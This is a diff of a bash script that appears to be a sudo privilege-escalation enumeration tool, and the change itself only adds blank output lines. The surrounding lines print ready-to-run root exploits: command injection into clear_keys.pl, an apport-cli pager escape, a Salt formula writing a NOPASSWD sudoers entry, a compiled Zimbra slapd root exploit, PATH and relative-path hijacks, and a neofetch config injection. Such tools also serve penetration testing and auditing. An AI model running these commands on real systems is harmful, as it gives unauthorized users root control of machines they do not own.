@@ -167,7 +167,7 @@ if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
     echo -e "[*] Generally the user that is allow to run the script is named spiderman"
     echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2013-4984.txt"
     echo -e "[*] Exploit: sudo /opt/cma/bin/clear_keys.pl fakeclientfqdn \";/bin/bash id;\" /fakedir \n"
-    #echo -e "\n"
+    echo -e "\n"
   fi
 
 fi
@@ -181,6 +181,7 @@ if [ -n "$check1" ] ; then
   echo -e "[-] $(echo "$cmd" | grep -i 'apport-cli' | sed 's/^ //g')"
   echo -e "[*] Notes: CVE/3rdPartyApps/CVE-2023-1326.txt"
   echo -e "[*] Exploit: sudo$check1 ${BLUE}then input v in the menu and run ${RESET}!id \n"
+  echo -e "\n"
 fi
 
 
@@ -200,6 +201,8 @@ if [ -n "$check1" ] && [ -n "$check2" ] ; then
             echo -e "[-] Note: CVE/CVE-2022-45153/CVE-2022-45153.txt"
             echo -e "[*] Exploit: cp CVE/CVE-2022-45153/ha_cluster_exploit.sls /usr/share/salt-formulas/states/ha_cluster_exploit.sls; echo '$who ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers \n"
             echo -e "[*] We then need to wait root user to run : salt-call --local state.apply ha_cluster_exploit once done we just need to sudo su"
+            echo -e "\n"
+            echo -e "\n"
     fi
      
 fi
@@ -214,7 +217,8 @@ if [ -n "$check1" ] && [ -n "$check2" ] ; then
     echo -e "[-] Zimbra current version $check3 [vulnerable version including 9.0.0 P25 and 8.8.15 P32]"
     echo -e "[-] Note: CVE/CVE-2022-45153/CVE-2022-45153.txt"
     echo -e "[*] Exploit: gcc -shared -o /tmp/slapper/libhax.so CVE/CVE-2022-45153/libhax.c; gcc -o /tmp/slapper/rootslap CVE/CVE-2022-45153/rootslap.c; sudo /opt/zimbra/libexec/zmslapd -u root -g root -f CVE/CVE-2022-45153/slapd.conf; /tmp/slapper/rootslap"
-
+    echo -e "\n"
+    echo -e "\n"
 fi
 
 
@@ -227,6 +231,7 @@ check2=$(echo "$cmd" 2>/dev/null | grep -i Defaults -A 5 | grep -i "setenv")
      echo -e "${BOLD}${GREEN}[-] A path hijacking is possible due to using setenv and relative path to a binary in the script from sudo's rule${RESET}"
      echo -e "[-] $(echo "$cmd" | grep -i 'kolla_copy_cacerts' | sed 's/^ //g')"
      echo -e "[*] Exploit: echo '#!/bin/bash' > /tmp/update-ca-certificates;echo 'id' >> /tmp/update-ca-certificates; chmod +x /tmp/update-ca-certificates; sudo PATH=/tmp:\$PATH $check1 ; rm /tmp/update-ca-certificates\n"
+     echo -e "\n"
  fi
 
 # ------------------------------------------------------
@@ -251,6 +256,7 @@ if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then
    echo -e "[-] $(echo $check3 | sed 's/^ //g')"
    #echo -e "[*] Exploit: export XDG_CONFIG_HOME=$check2; echo 'exec /bin/bash' >> $check2; sudo $cmdneo \n"
    echo -e "[*] Exploit: mkdir -p /tmp/cnf/neofetch;export XDG_CONFIG_HOME=/tmp/cnf; echo 'exec /bin/bash' >> /tmp/cnf/neofetch/config.conf; sudo $cmdneo; rm /tmp/cnf/neofetch/config.conf \n"
+   echo -e "\n"
 fi
 
 
@@ -277,6 +283,7 @@ if [ -n "$check1" ] && [ -n "$check2" ] ; then
              echo -e "${BOLD}${GREEN}[-] Creating a script with the same name in the current directory can be used for privilege escalation.${RESET}"
              echo -e "[-] $(echo $check1 | sed 's/^ //g')"
              echo -e "[*] Exploit: cd /tmp; echo '#!/bin/bash' > /tmp/$bashrelpath;echo 'id' >> /tmp/$bashrelpath; chmod +x /tmp/$bashrelpath;sudo $(echo $check1 | cut -d: -f2 | sed 's/^ //g'); rm /tmp/$bashrelpath"
+             echo -e "\n"
              echo -e "\n"
              fi
         done
